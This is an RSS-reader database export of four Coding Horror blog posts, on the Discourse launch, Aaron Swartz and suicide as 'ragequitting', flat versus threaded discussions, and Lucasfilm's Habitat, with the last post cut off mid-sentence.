{"subscription":{"$wrap":"$oid","v":16},"link":"http://www.codinghorror.com/blog/2013/02/civilized-discourse-construction-kit.html","title":"Civilized Discourse Construction Kit","published":{"$wrap":"$date","v":1360094393000,"h":"2013-02-05T19:59:53.000Z"},"starred":false,"read":false,"content":"<p>Occasionally, startups will ask me for advice. That's a shame, because I am <a href=\"http://www.codinghorror.com/blog/2012/05/how-to-stop-sucking-and-be-awesome-instead.html\">a terrible person to ask for advice</a>. The conversation usually goes something like this:</p><blockquote><p><i>We'd love to get your expert advice on our thing.</i></p><p>I probably don't use your thing. Even if I tried your thing out and I gave you my <a href=\"http://www.codinghorror.com/blog/2009/02/are-you-an-expert.html\">so-called Expert advice</a>, how would it matter? Anyway, why are you asking <i>me?</i> <b>Why don't you ask your community what <i>they</i> think of your thing?</b></p><p>And if you don't have a community of users and customers around your thing, well, there's your problem right there. Go fix <i>that</i>.</p></blockquote><p>Like I said, I don't get asked for advice too often. But for what it's worth, it is serious advice. And the next question they ask always strikes fear into my heart.</p><blockquote><p><i>You're so right! We need a place for online community around our thing. What software should we use?</i></p></blockquote><p>This is the part where I start playing <a href=\"http://www.sadtrombone.com/\">sad trombone</a> in my head. Because <b>all your software options for online community are, quite frankly, <i>terrible</i>.</b> Stack Exchange? We only do strict, focused Q&A there and you'd have to marshal your proposal through <a href=\"http://area51.stackexchange.com/\">Area 51</a>. Get Satisfaction, UserVoice, Desk, etcetera? Sorry, customer support isn't the same as community. Mailing lists? Just awful.</p><p>Forum software? <i>Maybe.</i> Let's see, it's 2013, has forum software advanced at all in the last <i>ten years?</i></p><p><table><tr><td style=\"vertical-align: top\"><a href=\"http://web.archive.org/web/20000815063701/http://boards.straightdope.com/sdmb/\" style=\"border-bottom: none\"><img src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017ee834156c970d-800wi\" width=\"365\" height=\"208\" alt=\"Straight Dope forums in 2000\" title=\"Straight Dope forums in 2000\" style=\"border:1px solid silver\" ></a></td><td style=\"vertical-align: top\"><a href=\"http://boards.straightdope.com/sdmb/\" style=\"border-bottom: none\"><img src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017c3690c747970b-pi\" width=\"365\" height=\"283\" alt=\"Straight Dope forums in 2012\" title=\"Straight Dope forums in 2013\" style=\"border:1px solid silver\"></a></td></tr></table></p><p>I'm thinking no.</p><p>Forums are the dark matter of the web, the B-movies of the Internet. But they matter. To this day <b>I regularly get excellent search results on forum pages for stuff I'm interested in</b>. Rarely a day goes by that I don't end up on some forum, somewhere, looking for some obscure bit of information. And more often than not, I find it there.</p><p>There's an amazing depth of information on forums.</p><ul><li>A 12 year old girl who finds a forum community of rabid enthusiasts willing to help her rebuild a Fiero from scratch? <a href=\"http://blog.makezine.com/2012/07/25/maker-faire-detroit-the-girl-who-plays-with-fieros-interview/\">Check</a>.<li>The most obsessive breakdown of Lego collectible minifig kits you'll find anywhere on the Internet? <a href=\"http://www.eurobricks.com/forum/index.php?showtopic=67132\">Check</a>.<li>Some of the most practical information on stunt kiting in the world? <a href=\"http://www.gwtwforum.com/\">Check</a>.<li>The only place I could find with scarily powerful squirt gun instructions and advice? <a href=\"http://www.waterwar.net/site_wwn/board/\">Check</a>.<li>The underlying research for a <a href=\"http://www.newyorker.com/reporting/2012/08/06/120806fa_fact_singer?currentPage=all\">New Yorker article</a> outing a potential serial marathon cheater? <a href=\"http://www.letsrun.com/forum/flat_read.php?thread=3863010\">Check</a>.</ul><p>I could go on and on. As much as existing forum software is inexplicably and terrifyingly awful after all these years, it is still the ongoing basis for a huge chunk of deeply interesting information on the Internet. These communities are incredibly passionate about incredibly obscure things. They aren't afraid to let their freak flag fly, and the world is a better place for it.</p><p>At Stack Exchange, one of the tricky things we learned about Q&A is that if your goal is to have an excellent signal to noise ratio, <b>you <i>must</i> suppress discussion.</b> Stack Exchange only supports the absolute minimum amount of discussion necessary to produce great questions and great answers. That's why answers get constantly re-ordered by votes, that's why comments have limited formatting and length and only a few display, and so forth. Almost every design decision we made was informed by our desire to push discussion down, to inhibit it in every way we could. Spare us the long-winded diatribe, just <i>answer the damn question already</i>.</p><p>After spending four solid years thinking of discussion as the established corrupt empire, and <a href=\"http://blog.stackoverflow.com/2009/05/the-stack-overflow-trilogy/\">Stack Exchange as the scrappy rebel alliance</a>, I began to wonder – what would it feel like to change sides? What if I became a champion of random, arbitrary discussion, of the very kind that I'd spent four years designing against and constantly lecturing users on the evil of?</p><p>I already built an X-Wing; could I build a better Tie Fighter?</p><p><img alt=\"Tie-fighter\" title=\"Tie-fighter\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017ee83490ac970d-800wi\" border=\"0\" /></p><p>If you're wondering what all those sly references to Tie Fighters were about in my previous blog posts and <a href=\"https://twitter.com/codinghorror\">tweets</a>, now you know. All hail the Emperor, and by the way, what's your favorite programming food?</p><p>Today we announce the launch of <a href=\"http://www.discourse.org\">Discourse</a>, a next-generation, 100% open source discussion platform built for the next decade of the Internet.</p><p><a href=\"http://www.discourse.org\"><img alt=\"Discourse-logo-big\" title=\"Discourse-logo-big\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017ee8349f31970d-800wi\" /></a></p><p>The goal of the company we formed, <b>Civilized Discourse Construction Kit, Inc.</b>, is exactly that – to raise the standard of civilized discourse on the Internet through seeding it with better discussion software:</p><ul><li>100% open source and free to the world, now and forever.<li>Feels <i>great</i> to use. It's fun.<li>Designed for hi-resolution tablets and advanced web browsers.<li>Built in moderation and governance systems that let discussion communities protect themselves from trolls, spammers, and bad actors – even without official moderators.</ul></p><p>Our <a href=\"http://blog.discourse.org/2013/02/the-discourse-team/\">amazingly talented team</a> has been working on Discourse for almost a year now, and although like any open source software it's never entirely <i>done</i>, we believe it is already a generation ahead of any other forum software we've used.</p><p>I greatly admire what WordPress did for the web; to say that we want to be the WordPress of forums is not a stretch at all. We're also serious about this eventually being a viable open-source <i>business</i>, <a href=\"http://mashable.com/2011/06/01/wordpress-business-models/\">in the mold of WordPress</a>. And we're not the only people who believe in the mission: I'm proud to announce that we have initial venture capital funding from <a href=\"http://www.firstround.com/\">First Round</a>, <a href=\"http://www.greylock.com/\">Greylock</a>, and <a href=\"http://svangel.com/\">SV Angel</a>. We're embarking on a five year mission to improve the fabric of the Internet, and we're just getting started. <b>Let a million discussions bloom!</b></p><p>So now, when someone says to me …</p><blockquote><p><i>You're so right! We need a place for community around our thing. What software should we use?</i></p></blockquote><p>I can reply without hesitation.</p><p>And hopefully, so can you.</p><table><tr><td class=\"welovecodinghorror\">[advertisement] Hiring developers? Post your open positions with <a href=\"http://careers.stackoverflow.com\" rel=\"nofollow\">Stack Overflow Careers</a> and reach over 20MM awesome devs already on Stack Overflow. Create <a href=\"http://careers.stackoverflow.com/jobs/post\" rel=\"nofollow\"> your satisfaction-guaranteed job listing</a> today!</td></tr></table>","author":false,"_id":{"$wrap":"$oid","v":1023}}
{"k":"0000000084","o":"0000008387","v":"001"}
{"_id":1024,"_uid":1024,"_dt":1373741607093,"_s":"c995cfb772fcbe061b1a683eb156cee1"}
{"subscription":{"$wrap":"$oid","v":16},"link":"http://www.codinghorror.com/blog/2013/01/the-end-of-ragequitting.html","title":"The End of Ragequitting","published":{"$wrap":"$date","v":1358802612000,"h":"2013-01-21T21:10:12.000Z"},"starred":false,"read":false,"content":"<p>When Joel Spolsky, my business partner on Stack Overflow and Stack Exchange, asked me what I wanted to do after <a href=\"http://www.codinghorror.com/blog/2012/02/farewell-stack-exchange.html\">I left Stack Exchange</a>, I distinctly remember mentioning <a href=\"http://en.wikipedia.org/wiki/Aaron_Swartz\">Aaron Swartz</a>. That's what Aaron was to us hackers: <b>an exemplar of the noble, selfless behavior and positive action that all hackers <i>aspire</i> to</b> – but very few actually achieve.</p><p>And now, tragically, Aaron is gone at the tender age of 26. He won't be achieving anything any more.</p><p>I never knew Aaron, but I <i>knew</i> Aaron.</p><p><a href=\"http://stackoverflow.com/users/4300/aaronsw\"><img alt=\"Aaron-swartz-stack-overflow\" title=\"Aaron-swartz-stack-overflow\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d404980a4970c-800wi\" border=\"0\" /></a></p><p>Most of all, I am disappointed.</p><p>I'm deeply disappointed in <b>myself</b>, for not understanding just how bitterly unfair the government charges were against Aaron. Perhaps the full, grotesque details couldn't be revealed for a pending legal case. But we should have been outraged. I am gutted that I did not contribute to his defense in any way, either financially or by writing about it here. I blindly assumed he would prevail, as powerful activists on the side of fairness, openness, and freedom are fortunate enough to often do in our country. I was wrong.</p><p>I'm disappointed in our <b>government</b>, for going to such lengths to make an example of someone who was so obviously a positive force. Someone who actively worked to change the world for the better in everything he did, starting from the age of 12. There was no evil in this man. And yet the absurd government case against him was cited by his family as <a href=\"http://www.latimes.com/news/obituaries/la-me-0113-aaron-swartz-20130113,0,5232490.story\">directly contributing to his death</a>.</p><p>I'm frustrated by the idea that <b>martyrdom</b> works. The death of Aaron Swartz is now turning into <a href=\"http://www.theatlantic.com/technology/archive/2013/01/aarons-law-violating-a-sites-terms-of-service-should-not-land-you-in-jail/267247/\">an effective tool for change</a>, a rallying cry, proving the perverse lesson that nobody takes an issue seriously until a great person dies for the cause. The idea that Aaron killing himself <i>was a viable strategy</i>, more than going on to prevail in this matter and so many more in his lifetime, makes me incredibly angry.</p><p>But also, I must admit that I am a little disappointed in <b>Aaron</b>. I understand that depression is a serious disease that can fell any person, however strong. But he chose the path of the activist long ago. And the path of the activist is to <i>fight</i>, for as long and as hard as it takes, to effect change. Aaron had powerful friends, a powerful support network, and a keen sense of moral cause that put him in the right. That's how he got that support network of powerful friends and fellow activists in the first place.</p><p>It is appropriate to write about Aaron on Martin Luther King day, because he too was <a href=\"http://www.africa.upenn.edu/Articles_Gen/Letter_Birmingham.html\">a tireless activist for moral causes</a>.</p><blockquote>I hope you are able to see the distinction I am trying to point out. In no sense do I advocate evading or defying the law, as would the rabid segregationist. That would lead to anarchy. <b>One who breaks an unjust law must do so openly, lovingly, and with a willingness to accept the penalty.</b> I submit that an individual who breaks a law that conscience tells him is unjust, and who willingly accepts the penalty of imprisonment in order to arouse the conscience of the community over its injustice, is in reality expressing the highest respect for law.</blockquote><p>Let's be clear that the penalty in Aaron's case was <i>grossly</i> unfair, <a href=\"http://harpers.org/blog/2013/01/carmen-ortiz-strikes-out/\">bordering on corrupt</a>. I've been a part of <a href=\"http://www.codinghorror.com/blog/2012/09/somebody-is-to-blame-for-this.html\">exactly one trial</a>, but I can't even imagine having the full resources of the US Government brought to bear against me, with extreme prejudice, for a year or more. His defense was estimated to cost millions. The idea that such an engaged citizen would be forever branded a felon – serving at least some jail time and stripped of the most fundamental citizenship right, the ability to vote – must have weighed heavily on Aaron. And Aaron was no stranger to depresson, having written about it on his blog many times, even penning a public will of sorts on his blog all the way back in 2002.</p><p>I think about <a href=\"http://knowyourmeme.com/memes/rage-quit\">ragequitting</a> a lot.</p><blockquote>Rage Quit, also seen as RageQuit in one word, is Internet slang commonly used to describe the act of suddenly quitting a game or chatroom after either an argument, extreme frustration, or loss of the game.</blockquote><p>At least one user ragequits Stack Exchange every six months, because our rules are strict. Some people don't like rules, and can respond poorly when confronted by the rules of the game they choose to play. It came up often enough that we had to create even more rules to deal with it. I was forced to think about ragequitting.<p></p>I was very angry with <a href=\"http://en.wikipedia.org/wiki/Mark_Pilgrim_(software_developer)#.22Disappearance.22_from_the_Internet\">Mark Pilgrim</a> and <a href=\"http://en.wikipedia.org/wiki/Why_the_lucky_stiff\">_why</a> for ragequitting the Internet, because they also took all their content offline – they got so frustrated that they took their ball and went home, so nobody else could play. How incredibly rude. Ragequitting is childish, a sign of immaturity. But it is another thing entirely to play the final move and take your own life. To declare the end of this game and all future games, <b>the end of ragequitting itself</b>.</p><p>I say this not as a person who wishes to judge Aaron Swartz. I say it as a fellow gamer who has also considered playing the same move quite recently. To the point that I – like Aaron himself, I am sure – was actively researching it. But the more I researched, the more I thought about it, the more it <a href=\"http://www.cracked.com/article_15658_the-ten-minute-suicide-guide.html\">felt like what it really was</a>: <i>giving up</i>. And the toll on friends and family would be unimaginably, unbearably heavy.</p><p>What happened to Aaron was not fair. Not even a little. But <i>this is the path of the activist</i>. The greater the injustice, the greater wrong undone when you ultimately prevail. And I am convinced, absolutely and utterly convinced, that Aaron <i>would</i> have prevailed. He would have gone on to do so many other great things. It is our great failing that we did not provide Aaron the support network he needed to see this. All we can do now is <a href=\"http://www.plainsite.org/asymptote/index.html\">continue the mission he started</a> and lobby for change to our <a href=\"http://www.forbes.com/sites/timothylee/2013/01/17/aaron-swartz-and-the-corrupt-practice-of-plea-bargaining/\">corrupt government practices of forcing plea bargains</a>.</p><p>It gets dark sometimes. I know it does. I'm right there with you. <b>But do not, under any circumstances, give anyone the satisfaction of seeing you ragequit.</b> They don't deserve it. Play other, better moves – and consider your long game.</p><table><tr><td class=\"welovecodinghorror\">[advertisement] <a href=\"http://careers.stackoverflow.com/\" rel=\"nofollow\">Stack Overflow Careers</a> matches the best developers (you!) with the best employers. You can search our <a href=\"http://careers.stackoverflow.com/jobs\" rel=\"nofollow\">job listings</a> or <a href=\"http://careers.stackoverflow.com/cv\" rel=\"nofollow\">create a profile</a> and even let employers find you.</td></tr></table>","author":false,"_id":{"$wrap":"$oid","v":1024}}
{"k":"0000000084","o":"0000011464","v":"001"}
{"_id":1025,"_uid":1025,"_dt":1373741607094,"_s":"39f55b9badcf94fb81c6a08693e6855c"}
{"subscription":{"$wrap":"$oid","v":16},"link":"http://www.codinghorror.com/blog/2012/12/web-discussions-flat-by-design.html","title":"Web Discussions: Flat by Design","published":{"$wrap":"$date","v":1355448242000,"h":"2012-12-14T01:24:02.000Z"},"starred":false,"read":false,"content":"<p>It's been six years since I wrote <a href=\"http://www.codinghorror.com/blog/2006/11/discussions-flat-or-threaded.html\">Discussions: Flat or Threaded?</a> and, despite a bunch of evolution on the web since then, my opinion on this has not fundamentally changed.</p><p>If anything, my opinion has strengthened based on the observed data: <i>precious few threaded discussion models survive on the web</i>. Putting aside Usenet as a relic and artifact of the past, it is rare to find threaded discussions of any kind on the web today; for web discussion communities that are more than ten years old, the vast majority are flat as a pancake.</p><p>I'm game for trying anything new, I mean, I even tried <i>Google Wave</i>. But the more I've used threaded discussions of any variety, the less I like them. I find precious few redeeming qualities, while threading tends to break crucial parts of discussion like reading and replying in deep, fundamental, unfixable ways. I have yet to discover a threaded discussion design that doesn't eventually make me hate it, and myself.</p><p>A part of me says this is software Darwinism in action: <b>threaded discussion is ultimately too complex to survive on the public Internet</b>.</p><p><a href=\"http://news.ycombinator.com/item?id=4887447\"><img alt=\"Hacker-news-threading\" title=\"Hacker-news-threading\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3ec46626970c-800wi\" width=\"720\" height=\"837\" /></a><br /></p><p>Before threaded discussion fans bring out their pitchforks and torches, I fully acknowledge that <i>aspects</i> of threading can be useful in certain specific situations. I will get to that. I know I'm probably wasting my time even attempting to say this, but please: keep reading before commenting. Ideally, read the <i>whole article</i> before commenting. Like Parappa, <a href=\"http://en.wikipedia.org/wiki/PaRappa_the_Rapper\">I gotta believe!</a></p><p>Before I defend threaded discussion, let's enumerate the many problems it brings to the table:</p><ol><li><b>It's a tree</b>. <br/><p>Poems about trees are indeed lovely, as Joyce Kilmer promised us, but <a href=\"http://www.codinghorror.com/blog/2005/03/trees-treeviews-and-ui.html\">data of any kind represented as a tree … isn't</a>. Rigid hierarchy is generally not how the human mind works, and the strict parent-child relationship it enforces is particularly terrible for fluid human group discussion. Browsing a tree is complicated, because you have to constantly think about what level you're at, what's expanded, what's collapsed … there's always this looming existential crisis of <i>where the heck am I?</i> Discussion trees force me to spend too much time mentally managing that two-dimensional tree more than the underlying discussion.</p><li><b>Where did that reply go?</b><br/><p>In a threaded discussion, replies can arrive any place in the tree at any time. How do you know if there are new replies? Where do you find them? Only if you happen to be browsing the tree at the right place at the right time. It's annoying to follow discussions over time when new posts keep popping up anywhere in the middle of the big reply tree. And God help you if you accidentally reply at the wrong level of the tree; then you're suddenly talking to the wrong person, or maybe nobody at all. For that matter, it absolutely <i>kills</i> me that there might be amazing, insightful responses buried somewhere in the middle of a reply chain that I will never be able to find. Most of all, it just makes me want to leave and never come back.</p><li><b>It pushes discussion off your screen</b>.<br/><p>So the first reply is indented under the post. Fair enough; how else would you know that one post is a reply to another post? But this indentation game <i>doesn't ever end</i>. Reply long and hard enough and you've either made the content column impossibly narrow, or you've pushed the content to exit, stage right. That's how endless pedantic responses-to-responses ruin the discussion for everyone. I find that in the \"indent everything to the right\" game, there are no winners, only losers. It is natural to scroll <i>down</i> on the web, but it is utterly unnatural to scroll <i>right</i>. Indentation takes the discussion in the wrong direction.</p><li><b>You're talking to everyone.</b><br/><p>You think because you clicked \"reply\" and your post is indented under the person you're replying to, that your post is talking only to that person? That's so romantic. Maybe the two of you should get a room. A special, private room at the far, far, far, far, <i>far</i> right of that threaded discussion. This illusion that you are talking to one other person ends up harming the discussion for everyone by polluting the tree with these massive narrow branches that are constantly in the way.</p><p>At an absolute minimum you're addressing everyone else in that discussion, but in reality, you're talking to anyone who will listen, for all time. Composing your reply as if it is a reply to just one person is a quaint artifact of a world that doesn't exist any more. Every public post you make on the Internet, reply or not, is actually talking to <i>everyone who will ever read it</i>. It'd be helpful if the systems we used for discussion made that clear, rather than maintaining this harmful pretense of private conversations in a public space.</p><li><b>I just want to scroll down.</b><p>Reddit (and to a lesser extent, Hacker News) are probably the best known examples of threaded comments applied to a large audience. While I find Reddit so much more tolerable than the bad old days of Digg, I can still barely force myself to wade through the discussions there, because it's so much darn <i>work</i>. As a lazy reader, I feel I've already done my part by deciding to enter the thread; after that all I should need to do is scroll or swipe down.</p><p>Take <a href=\"http://www.reddit.com/r/pics/comments/14svrt/my_little_brother_had_an_interesting_night/\">what's on the top of reddit right now</a>. It's a cool picture; who wouldn't want to meet Steve Martin and Morgan Freeman? But what's the context? Who is this kid? How did he get so lucky? To find out, I need to collapse and suppress dozens of random meaningless tangents, and the replies-to-tangents, by clicking the little minus symbol next to each one. So that's what I'm doing: reading a little, deciding that tangent is not useful or interesting, and clicking it to get rid of it. Then I arrive at the end and find out that information wasn't even in the topic, or at least I couldn't find it. I'm OK with scrolling down to find information and/or entertainment, to a point. What I object to is the menial labor of collapsing and expanding threaded portions of the topic as I read. Despite what the people posting them might think, those tangents aren't so terribly important that they're worth making me, and every other reader, act on them.</p></ol><p>Full bore, no-holds-barred threading is an unmitigated usability disaster for discussion, everywhere I've encountered it. But what if we didn't commit to this idea of threaded discussion quite so wholeheartedly?</p><p>The most important guidance for non-destructive use of threading is to <b>put a hard cap on the level of replies that you allow</b>. Although <a href=\"http://meta.stackoverflow.com/questions/92107/is-stack-overflow-a-forum\">Stack Exchange is not a discussion system</a> – it's actually the <i>opposite</i> of a discussion system, which we have to explain to people all the time – we did allow, in essence, one level of threading. There are questions and answers, yes, but underneath each of those, in smaller type, are the comments.</p><p><a href=\"http://wordpress.stackexchange.com/questions/74519/how-to-create-editable-blocks-of-text-for-the-homepage\"><img alt=\"Stack-exchange-threading\" title=\"Stack-exchange-threading\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017ee63983db970d-800wi\" width=\"720\" height=\"787\" /></a></p><p>Now there's a bunch of hard-core discussion sociology here that I don't want to get into, like different rules for comments, special limitations for comments, only showing the top n of comments by default, and so forth. What matters is that we allow <b>one level of replies and that's it</b>. Want to reply to a comment? You can, but it'll be at the same level. You can go no deeper. This is by design, but remember: <i>Stack Exchange is not a discussion system</i>. It's a question and answer system. If you build your Q&A system like a discussion system, it will devolve into Yahoo Answers, or even worse, Quora. Just kidding Quora. <a href=\"http://www.quora.com/What-did-Jesus-farts-probably-smell-like\">You're great</a>.</p><p>Would Hacker News be a better place for discussion if they capped reply level? Would Reddit? From my perspective as a poor, harried reader and very occasional participant, absolutely. There are many chronic problems with threaded discussion, but capping reply depth is the easiest way to take a giant step in the right direction.</p><p>Another idea is to let posts bring their context with them. This is one of the things that Twitter, the company that always does everything wrong and succeeds anyway, gets … shockingly right out of the gate. When I view <a href=\"https://twitter.com/codinghorror/status/276413253209448449\">one of my tweets</a>, it can stand alone, as it should. But it can also bring some context along with it on demand:</p><p><a href=\"https://twitter.com/codinghorror/status/276413253209448449\"><img class=\"asset  asset-image at-xid-6a0120a85dcdae970b017ee6399d08970d image-full\" alt=\"Twitter-threading\" title=\"Twitter-threading\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017ee6399d08970d-800wi\" width=\"600\" height=\"961\" /></a></p><p>Here you can see how <a href=\"https://twitter.com/codinghorror/status/276413253209448449\">my tweet</a> can be  expanded with a direct link or click to show the necessary context for the conversation. But it'll only show three levels: the post, my reply to the post, and replies to my post. This idea that tweets – and thus, conversations – should be mostly standalone is not well understood, but it illustrates how Twitter got the <i>original concept</i> so fundamentally right. I guess that's why they can get away with the terrible execution.</p><p>I believe <b>selective and judicious use of threading</b> is the only way it <i>can</i> work for discussion. You should be wary of threading as a general purpose solution for human discussions. Always favor simple, flat discussions instead.</p><table><tr><td class=\"welovecodinghorror\">[advertisement] How are you showing off your awesome? Create a <a href=\"http://careers.stackoverflow.com/cv\" rel=\"nofollow\">Stack Overflow Careers profile</a> and show off all of your hard work from Stack Overflow, Github, and virtually every other coding site. Who knows, you might even get recruited for a great <a href=\"http://careers.stackoverflow.com/jobs\" rel=\"nofollow\">new position</a>!</td></tr></table>","author":false,"_id":{"$wrap":"$oid","v":1025}}
{"k":"0000000084","o":"0000011643","v":"001"}
{"_id":1026,"_uid":1026,"_dt":1373741607094,"_s":"c032212e69bb21d2b423d6a98afab746"}
{"subscription":{"$wrap":"$oid","v":16},"link":"http://www.codinghorror.com/blog/2012/12/the-organism-will-do-what-it-damn-well-pleases.html","title":"The Organism Will Do Whatever It Damn Well Pleases","published":{"$wrap":"$date","v":1354354115000,"h":"2012-12-01T09:28:35.000Z"},"starred":false,"read":false,"content":"<p>In the go-go world of software development, we're so consumed with <a href=\"http://www.codinghorror.com/blog/2007/06/learning-or-learning-how-to-learn.html\">learning new things</a>, so <a href=\"http://www.codinghorror.com/blog/2008/01/the-magpie-developer.html\">fascinated with the procession of shiny new objects</a> that I think we sometimes lose sight of our history. I don't mean the big era-defining successes. Everyone knows those stories. I'm talking about the things we've tried before that … didn't quite work out. The failures. The also-rans. The noble experiments. The crazy plans.</p><p>I'm all for <a href=\"http://www.codinghorror.com/blog/2009/02/dont-reinvent-the-wheel-unless-you-plan-on-learning-more-about-wheels.html\">reinventing the wheel</a>, because it's one of the best ways to learn. But you shouldn't even <i>think</i> about reinventing a damn thing <b>until you've exhaustively researched every single last wheel, old or new, working or broken, that you can lay your hands on.</b> Do your homework.</p><p>That's why I love unearthing stories like <a href=\"http://www.fudco.com/chip/lessons.html\">The Lessons of Lucasfilm's Habitat</a>. It's basically World of Warcraft … in 1985.</p><p><blockquote><p><a href=\"http://en.wikipedia.org/wiki/Habitat_(video_game)\">Habitat</a> is \"a multi-participant online virtual environment,\" a cyberspace.</p><p><img alt=\"Habitat\" title=\"Habitat\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017c3424c4d8970b-800wi\" width=\"320\" height=\"240\" valign=\"right\" /></p><p>Each participant (\"player\") uses a home computer (Commodore 64) as an intelligent, interactive client, communicating via modem and telephone over a commercial packet-switching network to a centralized, mainframe host system. The client software provides the user interface, generating a real-time animated display of what is going on and translating input from the player into messages to the host. The host maintains the system's world model enforcing the rules and keeping each player's client informed about the constantly changing state of the universe.</p></blockquote><p>This was the dark ages of home computing. In 1985, that 64k of memory in a Commodore 64 was a <i>lot</i>. The entirety of Turbo Pascal 3.02 for DOS, released a year later in 1986, <a href=\"http://prog21.dadgum.com/116.html\">was barely 40k</a>.</p>The very concept of a multiplayer virtual world of any kind – something we take for granted today, since every modern website is essentially a multiplayer game now — was incredibly exotic. Look at the painstaking explanation Lucasfilm had to produce to even get folks to understand what the heck Habitat was, and how it worked:</p><iframe width=\"480\" height=\"360\" src=\"http://www.youtube.com/embed/VVpulhO3jyc\" frameborder=\"0\" allowfullscreen></iframe><p>The technical information in <a href=\"http://www.fudco.com/chip/lessons.html\">The Lessons of Lucasfilm's Habitat</a> is incredibly dated, as you'd expect, and barely useful even as trivia. But the sociological lessons of Habitat cut to the bone. They're as fresh today as they were in 1985. Computers have radically changed in the intervening 27 years, whereas people's behavior hasn't. At all. This particular passage hit home:</p><blockquote>Again and again we found that activities based on often unconscious assumptions about player behavior had completely unexpected outcomes (when they were not simply outright failures). It was clear that we were not in control. The more people we involved in something, the less in control we were. <b>We could influence things, we could set up interesting situations, we could provide opportunities for things to happen, but we could not predict nor dictate the outcome.</b> Social engineering is, at best, an inexact science, even in proto-cyberspaces. Or, as some wag once said, \"in the most carefully constructed experiment under the most carefully controlled conditions, the organism will do whatever it damn well pleases.\"</blockquote><p>Even more specifically:</p><blockquote>Propelled by these experiences, we shifted into a style of operations in which we let the players themselves drive the direction of the design. This proved far more effective. <b>Instead of trying to push the community in the direction we thought it should go, an exercise rather like herding mice, we tried to observe what people were doing and aid them in it.</b> We became facilitators as much as designers and implementors. This often meant adding new features and new regions to the system at a frantic pace, but almost all of what we added was used and appreciated, since it was well matched to people's needs and desires. As the experts on how the system worked, we could often suggest new activities for people to try or ways of doing things that people might not have thought of. In this way we were able to have considerable influence on the system's development in spite of the fact that we didn't really hold the steering wheel -- more influence, in fact, than we had had when we were operating under the delusion that we controlled everything.</blockquote><p>That's exactly what I was trying to say in <a href=\"http://www.codinghorror.com/blog/2012/02/listen-to-your-community-but-dont-let-them-tell-you-what-to-do.html\">Listen to Your Community, But Don't Let Them Tell You What to Do</a>. Unfortunately, because I hadn't read this essay until a few months ago, I figured this important lesson out <i>25 years later</i> than Randy Farmer and Chip Morningstar. So many Stack Overflow features were the direct result of observing what the community was doing, then attempting to aid them in it:</p><ul><li>We noticed early in the Stack Overflow beta that users desperately wanted to reply to each other, and were cluttering up the system with \"answers\" that were, well, not answers to the question. Rather than chastize them for doing it wrong – <i>stupid users!</i> – we added the commenting system to give them a method of annotating answers and questions for clarifications, updates, and improvements.<br/><br/><li>I didn't think it was necessary to have a place to discuss Stack Overflow. And I was … kind of a jerk about it. The community was on the verge of creating a phpBB forum instance to discuss Stack Overflow. Faced with a nuclear ultimatum, I relented, and you know what? <a href=\"http://www.codinghorror.com/blog/2009/07/meta-is-murder.html\">They were right</a>. And I was wrong.<br/><br/><li>The community came up with an interesting convention for <a href=\"http://blog.stackoverflow.com/2009/04/handling-duplicate-questions/\">handling duplicate questions</a>, by manually editing a blockquote into the top of the question with a link to the authoritative question that it was a duplicate of. This little user editing convention eventually became the template for the official implementation.</ul><p>I could go on and on, but I won't bore you. I'd say for every 3 features we introduced on Stack Overflow, at least two of them came more or less directly from observing the community, then trying to run alongside them, building tools that <b>helped them do what they wanted to do with less fuss and effort</b>. That was my job for the last four years. And I loved it, until I had to <a href=\"http://www.codinghorror.com/blog/2012/02/farewell-stack-exchange.html\">stop loving it</a>.</p><p><a href=\"http://en.wikipedia.org/wiki/Randy_Farmer\">Randy Farmer</a>, one of the primary designers of Habitat at Lucasfilm, went on to work on a bunch of things that you may recognize: with <a href=\"http://en.wikipedia.org/wiki/Douglas_Crockford#Career\">Douglas Crockford</a> on JSON, The Sims Online, Second Life, Yahoo 360°, Yahoo Answers, Answers.com, and so forth. He eventually condensed some of his experience into a book, <a href=\"http://www.amazon.com/dp/059615979X/?tag=codihorr-20\">Building Web Reputation Systems</a>, which I bought in April 2011 as a Kindle edition. I didn't know who Mr. Farmer was at this time. I just saw a new O'Reilly book on an area of interest, and I thought I'd check it out.</p><p><a href=\"http://www.amazon.com/dp/059615979X/?tag=codihorr-20\"><img  alt=\"Building-web-reputation-systems\" title=\"Building-web-reputation-systems\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3e54363b970c-800wi\" width=\"400\" height=\"525\" /></a></p><p>As the co-founder of Stack Overflow, I know a thing or two about web reputation systems! Out of curiosity, I looked up the author on my own site. And <a href=\"http://stackoverflow.com/users/523113/f-randall-farmer\">I found him</a>, with a <i>tiny</i> reputation. So I sent this friendly jibe on Twitter:</p><p><a href=\"https://twitter.com/frandallfarmer/status/57612082752925696\"><img alt=\"pff, look at @frandallfarmer's tiny rep! look at it!\" title=\"pff, look at @frandallfarmer's tiny rep! look at it!\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3e5422dd970c-800wi\" width=\"643\" height=\"335\" /></a></p><p>But the last laugh was on Randy, as it should be, because I didn't realize he had over <a href=\"http://rpg.stackexchange.com/users/810/f-randall-farmer\">6,000 reputation</a> on <a href=\"http://rpg.stackexchange.com\">rpg.stackexchange.com</a>. Turns out, Randy Farmer was already an avid Stack Exchange user. And, as you might guess given his background, a rather <i>expert</i> Stack Exchange user at that. The Stack Exchange ruleset is complex, strict, and requires discipline to understand. Kind of like.. maybe a <i>certain role playing game</i>, if you will.</p><p><a href=\"http://www.reddit.com/r/rpg/comments/xiwir/about_30_years_ago_my_dad_had_his_first_edition/\"><img alt=\"Advanced-dungeons-and-dragons\" title=\"Advanced-dungeons-and-dragons\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017ee5cb84ec970d-800wi\" width=\"500\" height=\"555\" /></a></p><p>Randy is the sort of dad who <a href=\"http://www.reddit.com/r/rpg/comments/xiwir/about_30_years_ago_my_dad_had_his_first_edition/\">had his first edition Dungeons & Dragons books bound into a single leather tome and handed it down to his son as a family heirloom</a>. How awesome is that?</p><p>If we've learned anything in the last 25 years since Habitat, it is that <b>people are the source of, and solution to, all the problems you'll run into when building social software</b>. Are you looking to (dungeon) master the art of 